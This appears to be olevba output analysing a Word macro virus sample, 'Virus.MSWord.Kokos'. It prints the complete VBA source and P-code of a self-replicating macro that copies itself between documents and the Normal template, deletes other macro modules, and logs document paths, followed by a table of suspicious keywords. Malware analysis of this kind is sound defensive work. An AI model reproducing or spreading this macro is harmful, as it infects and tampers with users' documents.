olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kokos
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SoSok.cls 
in file: Virus.MSWord.Kokos - OLE stream: 'Macros/VBA/SoSok'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 If MacroContainer.FullName = ActiveDocument.FullName Then
  If nt.Name <> "SoSok" Then GoTo ClaudioNormal
 Else
  If ad.Name <> "SoSok" Then GoTo Aquilesdocument
 End If
GoTo Findelmundo
Aquilesdocument:
 lineas = ad.CodeModule.CountOfLines
 ad.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= nt.CodeModule.CountOfLines
    cadenadecodigo = nt.CodeModule.lines(lineas, 1)
    ad.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 ad.Name = "SoSok"
 Open "C:\SoSok" For Append As #1
   Print #1, ActiveDocument.Path
 Close #1
 ActiveDocument.Save
GoTo Findelmundo
ClaudioNormal:
 lineas = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= ad.CodeModule.CountOfLines
    cadenadecodigo = ad.CodeModule.lines(lineas, 1)
    nt.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 nt.Name = "SoSok"
 NormalTemplate.Save
Findelmundo:
If Dir("C:\SoSok", vbNormal) <> "" Then
If FileLen("C:\SoSok") > 500 Then
 Response = MsgBox("Îáíàðóæåí âèðóñ 'SoSok'. ×òî äåëàòü? Âûêëþ÷èòü êîìïüþòåð?", vbYes, "Êàðàóë!!!")
  Application.Quit SaveChanges:=wdPromptToSaveChanges
End If
End If

End Sub

Private Sub Document_Open()
 On Error Resume Next
 If ActiveDocument.VBProject.VBComponents.Count > 1 Then
 For op = 2 To ActiveDocument.VBProject.VBComponents.Count
   cantidad = ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 If NormalTemplate.VBProject.VBComponents.Count > 1 Then
 For op = 2 To NormalTemplate.VBProject.VBComponents.Count
   cantidad = NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 Document_Close

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Kokos
' ===============================================================================
' Module streams:
' Macros/VBA/SoSok - 4172 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #5:
' 	Ld MacroContainer 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #6:
' 	Ld nt 
' 	MemLd New 
' 	LitStr 0x0005 "SoSok"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo ClaudioNormal 
' 	EndIf 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	Ld ad 
' 	MemLd New 
' 	LitStr 0x0005 "SoSok"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Aquilesdocument 
' 	EndIf 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	GoTo Findelmundo 
' Line #11:
' 	Label Aquilesdocument 
' Line #12:
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lineas 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld lineas 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #14:
' 	LitDI2 0x0001 
' 	St lineas 
' Line #15:
' 	Ld lineas 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Le 
' 	DoWhile 
' Line #16:
' 	Ld lineas 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St cadenadecodigo 
' Line #17:
' 	Ld lineas 
' 	Ld cadenadecodigo 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #18:
' 	Ld lineas 
' 	LitDI2 0x0001 
' 	Add 
' 	St lineas 
' Line #19:
' 	Loop 
' Line #20:
' 	LitStr 0x0005 "SoSok"
' 	Ld ad 
' 	MemSt New 
' Line #21:
' 	LitStr 0x0008 "C:\SoSok"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #24:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	GoTo Findelmundo 
' Line #26:
' 	Label ClaudioNormal 
' Line #27:
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lineas 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld lineas 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #29:
' 	LitDI2 0x0001 
' 	St lineas 
' Line #30:
' 	Ld lineas 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Le 
' 	DoWhile 
' Line #31:
' 	Ld lineas 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St cadenadecodigo 
' Line #32:
' 	Ld lineas 
' 	Ld cadenadecodigo 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #33:
' 	Ld lineas 
' 	LitDI2 0x0001 
' 	Add 
' 	St lineas 
' Line #34:
' 	Loop 
' Line #35:
' 	LitStr 0x0005 "SoSok"
' 	Ld nt 
' 	MemSt New 
' Line #36:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #37:
' 	Label Findelmundo 
' Line #38:
' 	LitStr 0x0008 "C:\SoSok"
' 	Ld vbNormal 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #39:
' 	LitStr 0x0008 "C:\SoSok"
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x01F4 
' 	Gt 
' 	IfBlock 
' Line #40:
' 	LitStr 0x0039 "Îáíàðóæåí âèðóñ 'SoSok'. ×òî äåëàòü? Âûêëþ÷èòü êîìïüþòåð?"
' 	Ld vbYes 
' 	LitStr 0x0009 "Êàðàóë!!!"
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #41:
' 	Ld wdPromptToSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndIfBlock 
' Line #44:
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' 	FuncDefn (Private Sub Document_Open())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #50:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #51:
' 	Ld op 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cantidad 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld cantidad 
' 	Ld op 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #53:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #56:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #57:
' 	Ld op 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cantidad 
' Line #58:
' 	LitDI2 0x0001 
' 	Ld cantidad 
' 	Ld op 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #59:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	ArgsCall Document_Close 0x0000 
' Line #62:
' Line #63:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

